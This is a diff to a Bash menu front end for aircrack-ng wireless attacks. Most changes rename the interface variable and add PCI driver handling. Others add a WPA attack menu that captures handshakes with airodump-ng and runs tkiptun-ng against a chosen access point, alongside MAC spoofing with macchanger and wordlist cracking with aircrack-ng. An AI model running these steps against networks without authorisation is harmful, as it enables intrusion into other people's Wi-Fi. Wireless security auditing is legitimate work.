@@ -227,7 +227,7 @@ done
 
 	# This way we detect clients. (Option 3)
 	function clientdetect {
-		iwconfig $WIFI channel $Host_CHAN
+		iwconfig $WIFICARD channel $Host_CHAN
 		capture & deauthall & menufonction # Those functions are used from many others, so I dont let them here, they'll be independent.
 	}
 
@@ -382,25 +382,30 @@ function witchattack {
 	elif [ "$Host_ENC" = " WPA " ] || [ "$Host_ENC" = "WPA" ]
 	then
 		monitor_interface2
-		wpahandshake
+		attackwpa
 	else
 		attackopn
 	fi			
 }
-
 	# If encryption detected...
 	function monitor_interface2 {
 		if [ "$TYPE" = "RalinkUSB" ]
 		then
-			IS_MONITOR=`$AIRMON start $WIFI $Host_CHAN |grep monitor`
-			iwconfig $WIFI mode monitor channel $Host_CHAN
+			IS_MONITOR=`$AIRMON start $WIFICARD $Host_CHAN |grep monitor`
+			iwconfig $WIFICARD mode monitor channel $Host_CHAN
 			echo $IS_MONITOR
 		elif [ "$TYPE" = "Ralinkb/g" ]
 		then
-			IS_MONITOR=`$AIRMON start $WIFI $Host_CHAN |grep monitor`
+			IS_MONITOR=`$AIRMON start $WIFICARD $Host_CHAN |grep monitor`
 			echo $IS_MONITOR
-			iwpriv $WIFI rfmontx 1
-			iwpriv $WIFI forceprism 1
+			iwpriv $WIFICARD rfmontx 1
+			iwpriv $WIFICARD forceprism 1
+		elif [ "$DRIVER" = "PCI" ]
+		then
+			IS_MONITOR=`$AIRMON start $WIFICARD $Host_CHAN |grep monitor`
+			echo $IS_MONITOR
+			iwpriv $WIFICARD rfmontx 1
+			iwpriv $WIFICARD forceprism 1
 	
 		elif [ "$TYPE" = "Atherosmadwifi-ng" ]
 		then
@@ -411,12 +416,12 @@ function witchattack {
 
 		elif [ "$DRIVER" = "zd1211rw_mac80211" ]
 		then
-			#IS_MONITOR=`$AIRMON start $WIFI $Host_CHAN |grep monitor`
+			#IS_MONITOR=`$AIRMON start $WIFICARD $Host_CHAN |grep monitor`
 			#echo $IS_MONITOR				
 			echo -e `gettext 'mac80211 device, not spamming another one => Doing nothing'`
 	
 		else
-			IS_MONITOR=`$AIRMON start $WIFI $Host_CHAN |grep monitor`
+			IS_MONITOR=`$AIRMON start $WIFICARD $Host_CHAN |grep monitor`
 			echo -e "`gettext \"Running standard monitor mode command\"`"
 			echo $IS_MONITOR
 		fi 
@@ -571,6 +576,39 @@ function witchattack {
 	}
 
 
+	function attackwpa {
+while true; do
+$CLEAR
+echo "`gettext '
+____________Select WPA Attack________
+#                                   #
+# 1) Standard attack                #
+# 2) Standard attack with QoS (WMM) #
+#___________________________________#
+Option: '`"
+read n
+	case $n in 
+		1) wpahandshake; $CLEAR; break;;
+		2) tkiptunstdqos; $CLEAR; break;;
+	esac
+done
+	}
+
+	# 1 just capture 
+
+	function wpahandshake {
+		$CLEAR
+		rm -rf $DUMP_PATH/$Host_MAC*
+		$CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Capturing data on channel:'` $Host_CHAN" $TOPLEFTBIG $BGC "$BACKGROUND_COLOR" $FGC "$DUMPING_COLOR" $EXECFLAG $AIRODUMP -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI & menufonction
+	}
+
+	# 2 Use tkiptun-ng
+	function tkiptunstdqos {
+		$CLEAR
+		rm -rf $DUMP_PATH/$Host_MAC*
+		ifconfig $WIFICARD channel $Host_CHAN # Hope this is ok for all cards
+		$CDCMD $TERMINAL $HOLD $TITLEFLAG "`gettext 'Executing tkiptun-ng for ap'` $Host_MAC" $TOPLEFTBIG $BGC "$BACKGROUND_COLOR" $FGC "$DUMPING_COLOR" $EXECFLAG $TKIPTUN -h $FAKE_MAC -a $Host_MAC -m $TKIPTUN_MIN_PL -n $TKIPTUN_MAX_PL  $WIFI & menufonction
+	}
 ##################################################################################
 ##################################################################################
 ######################### This is for CRACK (4)  option: ######################################
@@ -675,15 +713,15 @@ function selectcracking {
 		$TERMINAL $HOLDFLAG $TOPRIGHT $TITLEFLAG "Aircracking: $Host_SSID" $EXECFLAG $AIRCRACKOLD $FORCEWPAKOREK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST & menufonction # There was a -0 -s before $DPATH/$HmaC but -0 is not documented, anyway, it works, so I replaced it (-s is for showing ascii key)
 	}
 	
-##################################################################################
-##################################################################################
-######################### This is for Fake auth  (5)  option: ###################################
-##################################################################################
-##################################################################################
-# This is the function to select Target from a list
-## MAJOR CREDITS TO: Befa , MY MASTER, I have an ALTAR dedicated to him in my living room  
-## And HIRTE for making all those great patch and fixing the SSID issue	
-
+########################################################################################## 
+########################################################################################## 
+######################### This is for Fake auth  (5)  option: ############################ 
+########################################################################################## 
+##########################################################################################
+# This is the function to select Target from a list					 #
+# MAJOR CREDITS TO: Befa , MY MASTER, I have an ALTAR dedicated to him in my living room # 
+# And HIRTE for making all those great patch and fixing the SSID issue			 #
+##########################################################################################
 function choosefake {
 if [ "$Host_SSID" = "" ]
 then 
@@ -839,35 +877,36 @@ Option: '`"
 			break;
 		done
 
+		export WIFICARD=$WIFI
 		echo -n `gettext 'Should I put it in monitor mode?'` " (Y/n) "
 		read answer
 			if [ "$answer" != "n" ]
 			then
-				TYPE=`$AIRMON start $WIFI | grep monitor | awk '{print $2 $3}'`
-				DRIVER=`$AIRMON start $WIFI | grep monitor | awk '{print $4}'`
+				TYPE=`$AIRMON start $WIFICARD | grep monitor | awk '{print $2 $3}'`
+				DRIVER=`$AIRMON start $WIFICARD | grep monitor | awk '{print $4}'`
 			else
-				TYPE=`$AIRMON stop  $WIFI | grep monitor | awk '{print $2 $3}'`
-				DRIVER=`$AIRMON stop  $WIFI | grep monitor | awk '{print $4}'`
+				TYPE=`$AIRMON stop $WIFICARD | grep monitor | awk '{print $2 $3}'`
+				DRIVER=`$AIRMON stop $WIFICARD | grep monitor | awk '{print $4}'`
 			fi
 
 		$CLEAR
-		echo  `gettext 'Interface used is :'` $WIFI
+		echo  `gettext 'Interface used is :'` $WIFICARD
 		echo  `gettext 'Interface type is :'` "$TYPE ($DRIVER)"
 		testmac
 	}
 	# 3.
 	function cleanup {
 		killall -9 aireplay-ng airodump-ng > /dev/null &
-		$AIRMON stop $WIFI
-		ifconfig $WIFI down
+		$AIRMON stop $WIFICARD
+		ifconfig $WIFICARD down
 		$CLEAR
 		sleep 2
 		$CARDCTL eject
 		sleep 2
 		$CARDCTL insert
-		ifconfig $WIFI up
-		$AIRMON start $WIFI $Host_CHAN
-		iwconfig $WIFI
+		ifconfig $WIFICARD up
+		$AIRMON start $WIFICARD $Host_CHAN
+		iwconfig $WIFICARD
 	}
 	# 4.
 	function wichchangemac {
@@ -902,6 +941,9 @@ Option: '`"
 			elif [ "$TYPE" = "Ralinkb/g" ]
 			then
 				fakechangemacwlan
+			elif [ "$DRIVER" = "PCI" ]
+			then
+				fakechangemacwlan
 			elif [ "$TYPE" = "Atherosmadwifi-ng" ]
 			then
 				fakechangemacath
@@ -911,30 +953,35 @@ Option: '`"
 		}		
 			# And those from fakemacchanger
 			function fakechangemacrausb {
-				ifconfig $WIFI down
-				iwconfig $WIFI mode managed
+				ifconfig $WIFICARD down
+				iwconfig $WIFICARD mode managed
 				sleep 2
-				macchanger -m $FAKE_MAC $WIFI 
-				ifconfig $WIFI up
-				iwconfig $WIFI mode monitor			
+				macchanger -m $FAKE_MAC $WIFICARD
+				ifconfig $WIFICARD up
+				iwconfig $WIFICARD mode monitor			
 			}
 	
 			function fakechangemacwlan {
-				ifconfig $WIFI down
-				iwconfig $WIFI mode managed
+				echo -n "Shutting down interface..." 
+				ifconfig $WIFICARD down
+				echo -e "Done\n Putting in mode managed"
+				iwconfig $WIFICARD mode managed
 				sleep 2
-				macchanger -m $FAKE_MAC $WIFI 
-				ifconfig $WIFI up
-				iwconfig $WIFI mode monitor		
+				echo -n "Changing mac with macchanger..."
+				macchanger -m $FAKE_MAC $WIFICARD
+				echo "Done"
+				echo "Putting in mode monitor interface "
+				ifconfig $WIFICARD up
+				iwconfig $WIFICARD mode monitor		
 			}
 			
 			function fakechangemacath {
-				ifconfig $WIFI down
-				iwconfig $WIFI mode managed
+				ifconfig $WIFICARD down
+				iwconfig $WIFICARD mode managed
 				sleep 2
-				macchanger -m $FAKE_MAC $WIFI
-				ifconfig $WIFI up
-				iwconfig $WIFI mode monitor			
+				macchanger -m $FAKE_MAC $WIFICARD
+				ifconfig $WIFICARD up
+				iwconfig $WIFICARD mode monitor			
 			}
 		
 	
@@ -946,39 +993,43 @@ Option: '`"
 			elif [ "$TYPE" = "Ralinkb/g" ]
 			then 
 				changemacwlan
+			elif [ "$DRIVER" = "PCI" ]
+			then
+				changemacwlan
 			elif [ "$TYPE" = "Atherosmadwifi-ng" ]
 			then
 				changemacath
 			else
 				echo -e "`gettext \"Unknow way to change mac\"`"
+			echo "$DRIVER $TYPE"
 			fi			
 		}
 			# Those are part of macchanger
 			function changemacrausb {
-				ifconfig $WIFI down
-				iwconfig $WIFI mode managed
+				ifconfig $WIFICARD down
+				iwconfig $WIFICARD mode managed
 				sleep 2
-				macchanger -m $Client_MAC $WIFI
-				ifconfig $WIFI up
-				iwconfig $WIFI mode monitor			
+				macchanger -m $Client_MAC $WIFICARD
+				ifconfig $WIFICARD up
+				iwconfig $WIFICARD mode monitor			
 			}
 			
 			function changemacwlan {
-				ifconfig $WIFI down
-				iwconfig $WIFI mode managed
+				ifconfig $WIFICARD down
+				iwconfig $WIFICARD mode managed
 				sleep 2
-				macchanger -m $Client_MAC $WIFI
-				ifconfig $WIFI up
-				iwconfig $WIFI mode monitor			
+				macchanger -m $Client_MAC $WIFICARD
+				ifconfig $WIFICARD up
+				iwconfig $WIFICARD mode monitor			
 			}
 			
 			function changemacath {
-				ifconfig $WIFI down
-				iwconfig $WIFI mode managed
+				ifconfig $WIFICARD down
+				iwconfig $WIFICARD mode managed
 				sleep 2
-				macchanger -m $Client_MAC $WIFI
-				ifconfig $WIFI up
-				iwconfig $WIFI mode monitor			
+				macchanger -m $Client_MAC $WIFICARD
+				ifconfig $WIFICARD up
+				iwconfig $WIFICARD mode monitor			
 			}
 			
 		function macinput {
@@ -996,39 +1047,43 @@ Option: '`"
 				elif [ "$TYPE" = "Ralinkb/g" ]
 				then
 					manualchangemacwlan
+				elif [ "$DRIVER" = "PCI" ]
+				then
+					manualchangemacwlan
 				elif [ "$TYPE" = "Atherosmadwifi-ng" ]
 				then
 					manualchangemacath
 				else
 					echo "Unknow way to change mac"
+			echo "$DRIVER $TYPE"
 				fi			
 			}
 			# I suppose all this code if for precaution. I mean, if sometime the method differes between the different kind of cards, or if we've got to add a new card with a differente method.
 				function manualchangemacrausb {
-					ifconfig $WIFI down
-					iwconfig $WIFI mode managed
+					ifconfig $WIFICARD down
+					iwconfig $WIFICARD mode managed
 					sleep 2
-					macchanger -m $Client_MAC $WIFI
-					ifconfig $WIFI up
-					iwconfig $WIFI mode monitor			
+					macchanger -m $Client_MAC $WIFICARD
+					ifconfig $WIFICARD up
+					iwconfig $WIFICARD mode monitor			
 				}
 
 				function manualchangemacwlan {
-					ifconfig $WIFI down
-					iwconfig $WIFI mode managed
+					ifconfig $WIFICARD down
+					iwconfig $WIFICARD mode managed
 					sleep 2
-					macchanger -m $Client_MAC $WIFI
-					ifconfig $WIFI up
-					iwconfig $WIFI mode monitor				
+					macchanger -m $Client_MAC $WIFICARD
+					ifconfig $WIFICARD up
+					iwconfig $WIFICARD mode monitor				
 				}
 
 				function manualchangemacath {
-					ifconfig $WIFI down
-					iwconfig $WIFI mode managed
+					ifconfig $WIFICARD down
+					iwconfig $WIFICARD mode managed
 					sleep 2
-					macchanger -m $Client_MAC $WIFI
-					ifconfig $WIFI up
-					iwconfig $WIFI mode monitor				
+					macchanger -m $Client_MAC $WIFICARD
+					ifconfig $WIFICARD up
+					iwconfig $WIFICARD mode monitor				
 				}
 
 	# 5. 
@@ -1231,16 +1286,22 @@ Option: '`"
 	function monitor_interface {
 		if [ "$TYPE" = "RalinkUSB" ]
 		then
-			IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
-			iwconfig $WIFI mode monitor
+			IS_MONITOR=`$AIRMON start $WIFICARD |grep monitor`
+			iwconfig $WIFICARD mode monitor
 			echo $IS_MONITOR
 	
 		elif [ "$TYPE" = "Ralinkb/g" ]
 		then
-			IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
+			IS_MONITOR=`$AIRMON start $WIFICARD |grep monitor`
 			echo $IS_MONITOR
-			iwpriv $WIFI rfmontx 1 2>/dev/null
-			iwpriv $WIFI forceprism 1 2>/dev/null
+			iwpriv $WIFICARD rfmontx 1 2>/dev/null
+			iwpriv $WIFICARD forceprism 1 2>/dev/null
+		elif [ "$DRIVER" = "PCI" ]
+		then
+			IS_MONITOR=`$AIRMON start $WIFICARD |grep monitor`
+			echo $IS_MONITOR
+			iwpriv $WIFICARD rfmontx 1 2>/dev/null
+			iwpriv $WIFICARD forceprism 1 2>/dev/null
 	
 		elif [ "$TYPE" = "Atherosmadwifi-ng" ]
 		then
@@ -1251,7 +1312,7 @@ Option: '`"
 			echo $IS_MONITOR
 		else
 
-			IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
+			IS_MONITOR=`$AIRMON start $WIFICARD |grep monitor`
 			echo "Running standard monitor mode command"
 			echo $IS_MONITOR
 		fi 
@@ -1262,18 +1323,22 @@ Option: '`"
 	function airmoncheck {
 		if [ "$TYPE" = "RalinkUSB" ]
 		then
-			$AIRMON check $WIFI
+			$AIRMON check $WIFICARD
 			echo ""
 		elif [ "$TYPE" = "Ralinkb/g" ]
 		then
-			$AIRMON check $WIFI
+			$AIRMON check $WIFICARD
+			echo ""
+		elif [ "$DRIVER" = "PCI" ]
+		then
+			$AIRMON check $WIFICARD
 			echo ""
 		elif [ "$TYPE" = "Atherosmadwifi-ng" ]
 		then
 			$AIRMON check wifi0
 			echo ""
 		else
-			$AIRMON check $WIFI
+			$AIRMON check $WIFICARD
 			echo ""
 		fi 
 	}
@@ -1457,6 +1522,7 @@ function setinterface {
 	INTERFACES=`ip link|egrep "^[0-9]+"|cut -d ':' -f 2 |awk {'print $1'} |grep -v lo`
 	if [ "$WIFI" = "" ]
 	then
+
 		echo -e "\n_____"`gettext 'Interface selection'`"_____"
 		PS3="`gettext 'Select your interface: '`"
 		
@@ -1464,6 +1530,7 @@ function setinterface {
 			break;
 		done
 		
+		export WIFICARD=$WIFI
 			
 		echo -e "______________________________\n"
 
@@ -1471,11 +1538,11 @@ function setinterface {
 		read answer
 			if [ "$answer" != "n" ]
 			then
-				TYPE=`$AIRMON start $WIFI | grep monitor | awk '{print $2 $3}'`
-				DRIVER=`$AIRMON start $WIFI | grep monitor | awk '{print $4}'`
+				TYPE=`$AIRMON start $WIFICARD | grep monitor | awk '{print $2 $3}'`
+				DRIVER=`$AIRMON start $WIFICARD | grep monitor | awk '{print $4}'`
 			else
-				TYPE=`$AIRMON stop  $WIFI | grep monitor | awk '{print $2 $3}'`
-				DRIVER=`$AIRMON stop  $WIFI | grep monitor | awk '{print $4}'`
+				TYPE=`$AIRMON stop $WIFICARD | grep monitor | awk '{print $2 $3}'`
+				DRIVER=`$AIRMON stop $WIFICARD | grep monitor | awk '{print $4}'`
 			fi
 
 		$CLEAR
@@ -1484,7 +1551,7 @@ function setinterface {
 			testmac 
 		read -p "Do you want to use airserv-ng? [y/N] " var 
 		if [ "$var" == "y" ]; then
-			WIFICARD=$WIFI
+			export WIFICARD=$WIFI
 			read -p "Start a local server? [y/N] " var
 			if [ "$var" == "y" ]; then
 				export WIFI="127.0.0.1:666"
@@ -1502,17 +1569,17 @@ function setinterface {
 		read answer
 			if [ "$answer" != "n" ]
 			then
-				TYPE=`$AIRMON start $WIFI | grep monitor | awk '{print $2 $3}'`
-				DRIVER=`$AIRMON start $WIFI | grep monitor | awk '{print $2 $3}'`
+				TYPE=`$AIRMON start $WIFICARD | grep monitor | awk '{print $2 $3}'`
+				DRIVER=`$AIRMON start $WIFICARD | grep monitor | awk '{print $2 $3}'`
 
 			else
-				TYPE=`$AIRMON stop  $WIFI | grep monitor | awk '{print $2 $3}'`
-				DRIVER=`$AIRMON stop  $WIFI | grep monitor | awk '{print $2 $3}'`
+				TYPE=`$AIRMON stop $WIFICARD | grep monitor | awk '{print $2 $3}'`
+				DRIVER=`$AIRMON stop $WIFICARD | grep monitor | awk '{print $2 $3}'`
 			fi
 
 		$CLEAR
 
-		echo  `gettext 'Interface used is :'` $WIFI
+		echo  `gettext 'Interface used is :'` $WIFICARD
 		echo  `gettext 'Interface type is :'` "$TYPE ($DRIVER)"
 		testmac
 	fi
@@ -1531,7 +1598,7 @@ function testmac {
 	if [ "$TYPE" = "Atherosmadwifi-ng" ]
 	then
 		echo "Previous fake_mac : $FAKE_MAC"
-		FAKE_MAC=`ifconfig $WIFI | grep $WIFI | awk '{print $5}' | cut -c -17  | sed -e "s/-/:/" | sed -e "s/\-/:/"  | sed -e "s/\-/:/" | sed -e "s/\-/:/" | sed -e "s/\-/:/"`
+		FAKE_MAC=`ifconfig $WIFICARD | grep $WIFI | awk '{print $5}' | cut -c -17  | sed -e "s/-/:/" | sed -e "s/\-/:/"  | sed -e "s/\-/:/" | sed -e "s/\-/:/" | sed -e "s/\-/:/"`
 		echo -e "`gettext \"Changed fake_mac : $FAKE_MAC\"`" 
 	else
 		echo ""
